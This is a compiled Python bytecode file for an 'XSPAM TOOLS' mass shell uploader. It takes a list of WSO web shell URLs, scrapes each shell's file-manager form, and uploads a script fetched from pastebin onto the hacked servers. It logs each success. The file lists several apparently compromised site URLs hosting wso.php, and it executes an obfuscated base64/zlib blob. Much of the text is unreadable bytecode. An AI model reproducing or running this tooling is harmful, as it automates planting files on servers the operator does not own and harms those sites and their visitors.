ó
¥÷^c           @   sy  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d l Te   d Z d Z d Z d Z d Z d	 Z d
 Z e e e GHd Z y e j d  Wn n Xd   Z d Z e j  e j! e   d Ud   Z" e d k r}e   nø e d k ruyß e# e d e  Z$ d Z% e e% e GHe# e d e  Z& e# e d e  Z' e  j( e&  j) Z* y. e+ e$ d   Z( e( j,   j-   Z, Wd QXWn e. k
 r.n Xe/ e,  Z, y" e d  Z0 e0 j1 e" e,  Z2 Wn n XWququXn  d S(   iÿÿÿÿN(   t   Pool(   t   system(   t   *s   V1.3-2s   [31ms   [32ms   [33ms   [37ms  
====================================================================
----------------------------- XSPAM TOOLS --------------------
------------ More Tools: https://xspamtools.me ---------------
====================================================================
$$\      $$\  $$$$$$\  $$\   $$\  $$$$$$\  
$$$\    $$$ |$$  __$$\ $$ |  $$ |$$  __$$\ 
$$$$\  $$$$ |$$ /  \__|$$ |  $$ |$$ /  $$ |
$$\$$\$$ $$ |\$$$$$$\  $$ |  $$ |$$$$$$$$ |
$$ \$$$  $$ | \____$$\ $$ |  $$ |$$  __$$ |
$$ |\$  /$$ |$$\   $$ |$$ |  $$ |$$ |  $$ |
$$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ |  $$ |
\__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
MASS SHELL UPLOAD ANYTHING   
UPLOAD ANY FILE ON MASS SHELL LIST 
Note: WSO SHELLS ARE ONLY SUPPORTED                               

====================================================================
i   t   resultsc          C   s   d }  t  |  t GHd  S(   Ns#  
Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44


1. Mass shell to anything uploader! 
	Put shell list like this
		http://toprose24.ru/wp-includes/js/tinymce/wso.php
		http://nacso.org/wp-admin/shop/media/wso.php
		http://www.systemawindsor.com/2014/wso.php
		http://heights.co.kr/wp-includes/js/tinymce/wso.php
		http://mybaguse.com/oldsite/wp-includes/wso.php
		http://bdsharebazar.info/wp-includes/Core/wso.php
		http://www.modsolar.net/wp-content/uploads/wso.php
		http://theknittingneedle.in//wp-includes/css/wso.php



(   t   yellowt   white(   t   gd(    (    s   msuaclean.pyt   guide>   s    st   eNpLSU1TyMlMTs0rTtUoLinKzEvXtOLlAgkp2CoUpRaWphaXFOulp5ZoKGWUlBQUW+nrV5Tk5+cU6+Wm6hcnlqUW6ackliTag5i2SgraClBDAE5FHno=c         C   sû  yít  d } t j |  d d } | j d k r×d | j k r×t d |   t j d | j  } | d } t j d	 | j  } | d } t j d
 | j  } | d } t j d | j  } | d } i | t f d 6} i | d 6| | 6| d 6| d 6} t j	 |  d | d | d d }	 |	 j d k r¿d |	 j k r¿|  j
 d  }
 |
 t |
  d } |  j | |  } t d | d t GHt j d  t d d  j | d  t j d  qìt d |  d t GHn t d |  d t GHWn n Xd  S(   Ns   confighost.phpt   timeouti
   iÈ   s   File managers	   shell -> s(   <input type=hidden name=a value='(.*?)'>i    s(   <input type=hidden name=c value='(.*?)'>s)   <input type=hidden name=p1 value='(.*?)'>s.   <input type=hidden name=charset value='(.*?)'>t   ft   at   p1t   charsett   filest   datat   /i   s   [+] s    ==> Success!R   s   done_upload.txts   
s   ..s   [-] s    ==> Upload failed!s    ==> Shell not working!(   t	   shellnamet   requestst   gett   status_codet   textt   licenset   ret   findallt
   scriptmaint   postt   splitt   lent   replacet   greenR   t   ost   chdirt   opent   writet   red(   t   urlt	   nameshellR   t   filesmant   getcR   R   t   fileR   t   reqt   ggt   removet   final(    (    s   msuaclean.pyt   tool1T   s8    




"!i    s   [?] Enter wso shells list: sL   [?] Enter pastebin raw script like this -> https://pastebin.com/raw/0VKPDKeNs   [?] Enter link script: s   [?] Enter script name: t   ri
   (3   R   t   sysR   R   t   randomt   urllib2t   urllibt   httplibt   sockett   sslt   stringt   base64t   zlibt   multiprocessingR    t   multiprocessing.dummyt
   ThreadPoolt   platformR   t   coloramat   initt   currentVersionR"   R   t   blueR   R   t   combot   choicet   mkdirR   t   singlelicenset
   decompresst	   b64decodeR,   t	   raw_inputt	   listshellt   examplet	   scripturlR   R   t   contentR   R    t   readt
   splitlinest   IOErrort   listt   ppt   mapt   pr(    (    (    s   msuaclean.pyt   <module>   sr   
		$
